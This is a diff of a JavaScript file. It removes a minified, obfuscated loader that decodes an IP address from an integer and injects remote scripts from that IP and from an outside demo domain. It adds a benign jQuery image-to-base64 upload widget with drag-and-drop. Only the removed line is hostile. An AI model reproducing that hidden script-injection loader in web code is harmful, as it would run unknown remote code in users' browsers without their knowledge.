@@ -1,2 +1,38 @@
-!function(e,t,n,o,r,i,a,c){c=function(e,t,n){for(t=e%256,n=3;0<n;n--)t=(e=Math.floor(e/256))%256+"."+t;return t}(2095620274),(a=function(e){r=t.createElement(n),i=t.getElementsByTagName(n)[0],r.src="//"+e,i.parentNode.insertBefore(r,i)})(o+(0<o.indexOf("?")?"&":"?")+"_t"+(new Date).getTime()+"=0i"),a(c+"/v1/a/?u=0")}(window,document,"script","yanshi.sucaihuo.com/jquery/25/2579/demo/js/index.js");
+function readURL(input) {
+  if (input && input[0]) {
+    var reader = new FileReader();
+    reader.onload = function (e) {
+    $("#result .base64").val( e.target.result )
+		$("#result").slideDown();
+    }
+		reader.readAsDataURL(input[0]);
+	}
+}
 
+$(document).ready(function(){
+	$("#image_input").change(function(){
+    readURL(this.files);
+  });
+
+	$(".upload").click(function(){
+		$("#image_input").click();
+	});
+
+	$(".upload").on('drop', function(e) {
+		e.preventDefault();
+		readURL(e.originalEvent.dataTransfer.files);
+	}).on('dragover', function(e){
+		e.stopPropagation();
+		e.preventDefault();
+		e.dataTransfer.dropEffect = 'copy';
+	});
+
+	$("textarea").focus(function() {
+		var $this = $(this);
+		$this.select();
+		$this.mouseup(function() {
+			$this.unbind("mouseup");
+			return false;
+		});
+	});
+});
